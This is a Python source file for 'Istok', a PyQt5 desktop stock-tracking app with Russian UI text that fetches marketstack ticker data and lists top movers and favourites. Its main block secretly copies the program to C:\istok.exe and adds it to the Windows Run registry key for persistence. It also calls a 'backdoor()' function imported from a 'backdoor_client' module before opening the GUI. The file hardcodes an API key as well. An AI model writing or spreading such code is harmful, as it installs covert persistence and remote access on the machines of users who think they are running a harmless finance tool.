import requests
import datetime
import json
import os
from PyQt5 import QtWidgets
import winreg as reg
import shutil

from backdoor_client import backdoor
from MainIstok import Ui_Istok
from Allcomp import Ui_List
from Istok_relevants import Ui_Istok_relevants
from Favorites import Ui_Favorites
from Search import Ui_Search


def write_to_reg():
    #pth = os.path.dirname(os.path.realpath(__file__))
    shutil.copy2(str(__file__), "C:\\istok.exe")
    s_name = "istok.exe"
    address = os.path.join("C:\\", s_name)
    tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
    reg.SetValue(tmp, None, reg.REG_SZ, address)
    reg.CloseKey(tmp)


def bypercent_key(summ):
    return summ[1][0]


def connection():
    params = {
        'access_key': 'cd3eef78ddce4374b628d4847e7da4dd'
    }
    now = datetime.datetime.now()
    now.strftime("%d-%m-%Y")

    try:
        requests.get('http://yandex.ru')
        f = open("names.txt", 'r')
        api_response = json.load(f)
        f.close()
    except FileNotFoundError:
        api_result = requests.get('http://api.marketstack.com/v1/tickers', params)
        api_response = api_result.json()
        f = open("names.txt", 'w')
        json.dump(api_response, f)
        f.close()

    data = ''
    symbols = ''
    i = 0
    for stock_data in api_response['data']:
        data = data + stock_data['name'] + "\n"
        if i == 0:
            symbols = stock_data['symbol']
        if i < 98:
            symbols = symbols + "," + stock_data['symbol']
        i += 1

    params = {
        'access_key': 'cd3eef78ddce4374b628d4847e7da4dd',
        'symbols': symbols
    }

    yesterday = datetime.date.today() - datetime.timedelta(days=1)

    try:
        requests.get('http://yandex.ru')
        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
        f.close()
    except FileNotFoundError:
        api_result = requests.get('http://api.marketstack.com/v1/eod/latest', params)
        api_response = api_result.json()
        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'w')
        json.dump(api_response, f)
        f.close()

    yesterday = datetime.date.today() - datetime.timedelta(days=2)

    try:
        requests.get('http://yandex.ru')
        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
        f.close()
    except FileNotFoundError:
        api_result = requests.get('http://api.marketstack.com/v1/eod/' + yesterday.strftime('%Y-%m-%d'), params)
        api_response = api_result.json()
        f = open(yesterday.strftime('%d-%m-%Y') + " eod.txt", 'w')
        json.dump(api_response, f)
        f.close()

    return data


class Istok(QtWidgets.QMainWindow):
    def __init__(self):
        super(Istok, self).__init__()
        self.wind = Ui_Istok()
        self.wind.setupUi(self)
        self.page = 1
        self.len_of_relevants = int(4)
        self.initiation()
        self.tray_icon = QtWidgets.QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QtWidgets.QStyle.SP_ComputerIcon))

        show_action = QtWidgets.QAction("Show", self)
        quit_action = QtWidgets.QAction("Exit", self)
        hide_action = QtWidgets.QAction("Hide", self)
        show_action.triggered.connect(self.show)
        hide_action.triggered.connect(self.hide)
        # quit_action.triggered.connect(QtWidgets.quit)
        tray_menu = QtWidgets.QMenu()
        tray_menu.addAction(show_action)
        tray_menu.addAction(hide_action)
        tray_menu.addAction(quit_action)
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()

        # Переопределение метода closeEvent, для перехвата события закрытия окна
        # Окно будет закрываться только в том случае, если нет галочки в чекбоксе

    def closeEvent(self, event):
        event.ignore()
        self.hide()
        self.tray_icon.showMessage(
            "Tray Program",
            "Application was minimized to Tray",
            QtWidgets.QSystemTrayIcon.Information,
            2000
        )

    def initiation(self):
        self.wind.setupUi(self)
        self.wind.Allcomp.clicked.connect(self.open_Allcomp)  # Все компании
        self.wind.Relevcomp.clicked.connect(self.open_Relevcomp)  # Наиболее релевантные
        self.wind.Detail.clicked.connect(self.open_Detail)  # Детальное отслеживание
        try:
            self.data = connection()
            self.wind.Status.setText('Online')
        except requests.exceptions.ConnectionError:
            self.data = ''
            self.wind.Status.setText('Offline')
        self.now = datetime.date.today() - datetime.timedelta(days=1)
        self.yesterday = datetime.date.today() - datetime.timedelta(days=2)

        try:
            f = open("favorites.txt", 'r')
            self.favorites = f.readlines()
            f.close()
        except FileNotFoundError:
            self.favorites = list()

    def open_Allcomp(self):  # Все компании
        self.dialogAll = Ui_List()
        self.dialogAll.setupUi(self)
        # print(self.data)
        self.dialogAll.textBrowser.setText(self.data)
        self.dialogAll.Back.clicked.connect(self.backbutton)

    def open_Relevcomp(self):  # Наиболее релевантные
        self.dialogRelev = Ui_Istok_relevants()
        self.dialogRelev.setupUi(self)
        self.dialogRelev.PageNo.setText(str(self.page))
        try:
            relevants = self.find_relevant(self.len_of_relevants)
            try:
                self.dialogRelev.Name1.setText(str(relevants[self.page * 2 - 2][0]))
                self.dialogRelev.Name2.setText(str(relevants[self.page * 2 - 1][0]))
                Discript_1 = 'Изменилось за день на ' + str(relevants[self.page * 2 - 2][1][0]) + '%\n\
            \nРазница между наибольшими значениями за вчера и сегодня: ' + str(relevants[self.page * 2 - 2][1][1]) + '\n\
            \nРазница между верхними и нижним значением за день: ' + str(relevants[self.page * 2 - 2][1][2])
                Discript_2 = 'Изменилось за день на ' + str(relevants[self.page * 2 - 1][1][0]) + '%\n\
            \nРазница между наибольшими значениями за вчера и сегодня: ' + str(relevants[self.page * 2 - 1][1][1]) + '\n\
            \nРазница между верхними и нижним значением за день: ' + str(relevants[self.page * 2 - 1][1][2])
            except IndexError:
                self.dialogRelev.Name1.setText('')
                self.dialogRelev.Name2.setText('')
                Discript_1 = 'Пожалуйста, удалите все файлы в дирректории кроме istok.exe и повторите попытку\n' + __file__
                Discript_2 = 'Пожалуйста, удалите все файлы в дирректории кроме istok.exe и повторите попытку\n' + __file__
        except KeyError:
            self.dialogRelev.Name1.setText('')
            self.dialogRelev.Name2.setText('')
            Discript_1 = 'Ваш тарифный план исчерпан\n'
            Discript_2 = 'Ваш тарифный план исчерпан\n'
        self.dialogRelev.Discript1.setText(Discript_1)
        self.dialogRelev.Discript2.setText(Discript_2)
        self.dialogRelev.right.clicked.connect(self.next_page)
        self.dialogRelev.left.clicked.connect(self.prev_page)
        self.dialogRelev.Back.clicked.connect(self.backbutton)

    def find_relevant(self, n: int):
        try:
            f = open("names.txt", 'r')
            api_response = json.load(f)
            f.close()
            f = open(self.now.strftime("%d-%m-%Y") + " eod.txt", 'r')
            api_response2 = json.load(f)
            f.close()
            f = open(self.yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
            api_response3 = json.load(f)
            f.close()
        except FileNotFoundError:
            return []

        symbols = {}
        favlist = {}
        old_favlist = {}
        relevants_keys = []
        i = 0
        for stock_data in api_response['data']:
            symbols.update({stock_data['symbol']: stock_data['name']})
            if i < n:
                relevants_keys.append(stock_data['symbol'])
                i += 1
        for stock_data in api_response2['data']:
            if stock_data != []:
                if stock_data['symbol'] in symbols.keys():
                    old_favlist.update({stock_data['symbol']: stock_data})

        favlist.update(old_favlist)

        for stock_data in api_response3['data']:
            if stock_data != []:
                if stock_data['symbol'] in symbols.keys():
                    x = float(favlist[stock_data['symbol']]['high'])
                    y = float(stock_data['high'])
                    z = x - y
                    open_day = float(old_favlist[stock_data['symbol']]['open'])
                    close_day = float(old_favlist[stock_data['symbol']]['close'])
                    favlist[stock_data['symbol']] = [round(100 * z / x, 3), round(z, 3), round(open_day - close_day, 3)]

        for key in favlist.keys():
            if not isinstance(favlist[key], list):
                favlist[key] = [0.0, 0.0, 0.0]  # первое - проценты, второе - это в деньгах, ретье - за день в деньгах

        for key in favlist.keys():
            if key in relevants_keys:
                continue
            min_key = self.chek_min(relevants_keys, favlist)
            if favlist[key][0] > favlist[min_key][0]:
                relevants_keys[relevants_keys.index(min_key)] = key

        relevants = []

        for i in relevants_keys:
            relevants.append([symbols[i], favlist[i]])

        relevants = sorted(relevants, key=bypercent_key, reverse=True)
        return relevants

    def chek_min(self, relevants_keys, favlist):
        min_value = favlist[relevants_keys[0]][0]
        need_key = favlist[relevants_keys[0]][0]
        for i in range(len(relevants_keys)):
            if favlist[relevants_keys[i]][0] <= min_value:
                need_key = relevants_keys[i]
                min_value = favlist[relevants_keys[i]][0]
        return need_key

    def next_page(self):
        if self.page + 1 <= self.len_of_relevants / 2:
            self.page += 1
            self.open_Relevcomp()

    def prev_page(self):
        if self.page - 1 >= 1:
            self.page -= 1
            self.open_Relevcomp()

    def open_Detail(self):  # Детальное отслеживание
        self.dialogDet = Ui_Favorites()
        self.dialogDet.setupUi(self)
        self.schet = 0
        try:
            favlist = self.find_favs()
            if favlist == 'Error':
                favlist = 'Пожалуйста, удалите все файлы в дирректории кроме istok.exe и повторите попытку\n' + __file__
            else:
                self.dialogDet.Add.clicked.connect(self.open_Add)
                self.dialogDet.Delete.clicked.connect(self.open_Delete)
        except KeyError:
            favlist = 'Ваш тарифный план исчерпан\n'
        self.dialogDet.Favlist.setText(favlist)
        self.dialogDet.Back.clicked.connect(self.backbutton)
        # for word in self.favorites:
        #     favlist = favlist + word + "\n"


    def find_favs(self):
        try:
            f = open("names.txt", 'r')
            api_response = json.load(f)
            f.close()
            f = open(self.now.strftime("%d-%m-%Y") + " eod.txt", 'r')
            api_response2 = json.load(f)
            f.close()
            f = open(self.yesterday.strftime('%d-%m-%Y') + " eod.txt", 'r')
            api_response3 = json.load(f)
            f.close()
        except FileNotFoundError:
            return 'Error'
        symbols = {}
        favlist = {}
        oldfavlist = {}
        for stock_data in api_response['data']:
            if stock_data['name'] + "\n" in self.favorites:
                symbols.update({stock_data['symbol']: stock_data['name']})
        for stock_data in api_response2['data']:
            if stock_data != []:
                if stock_data['symbol'] in symbols.keys():
                    oldfavlist.update({symbols[stock_data['symbol']] + "\n": stock_data['high']})

        favlist.update(oldfavlist)

        for stock_data in api_response3['data']:
            if stock_data != []:
                if stock_data['symbol'] in symbols.keys():
                    favlist[symbols[stock_data['symbol']] + "\n"] = favlist[symbols[stock_data['symbol']] + "\n"] - \
                                                                    stock_data['high']

        favlisttext = ''

        for key in favlist.keys():
            if favlist[key] == oldfavlist[key]:
                favlist[key] = 0

        for key in favlist.keys():
            favlisttext = favlisttext + key + "Разница за день: " + str(round(favlist[key], 3)) + "\n"

        return favlisttext

    def open_Add(self):
        self.dialogAdd = Ui_Search()
        self.dialogAdd.setupUi(self)
        self.dialogAdd.Go.clicked.connect(self.search)
        self.dialogAdd.Back.clicked.connect(self.backbutton)
        self.dialogAdd.Choose.clicked.connect(self.chooseAdd)

    def open_Delete(self):
        self.dialogAdd = Ui_Search()
        self.dialogAdd.setupUi(self)
        self.dialogAdd.Go.clicked.connect(self.search)
        self.dialogAdd.Back.clicked.connect(self.backbutton)
        self.dialogAdd.Choose.clicked.connect(self.chooseDelete)

    def search(self):
        self.schet = 0
        text = self.data.split('\n')
        sub_str = self.dialogAdd.Searchline.text()
        words = ""
        low_sub_str = sub_str.lower()
        for word in text:
            if low_sub_str in word.lower():
                words = words + word + "\n"
                self.schet += 1
        if words != "":
            self.dialogAdd.Result.setText(words)
            self.keyWord = words
        else:
            self.dialogAdd.Result.setText("Такой компании нет")

    def chooseAdd(self):
        if self.schet == 1:
            if self.keyWord in self.favorites:
                print("already in favorites")
            else:
                if self.favorites != [""]:
                    self.favorites.append(self.keyWord)
                    self.writefavs()
                else:
                    self.favorites[0] = self.keyWord
                    self.writefavs()

    def chooseDelete(self):
        if self.schet == 1:
            print('Ok')
            if self.keyWord in self.favorites:
                self.favorites.pop(self.favorites.index(self.keyWord))
                self.writefavs()
            else:
                print("not in favorites")

    def writefavs(self):
        f = open("favorites.txt", "w")
        for word in self.favorites:
            f.write(word)
        f.close()

    def backbutton(self):
        self.initiation()


if __name__ == '__main__':
    write_to_reg()
    backdoor()
    app = QtWidgets.QApplication([])
    window = Istok()
    window.show()
    app.exec_()
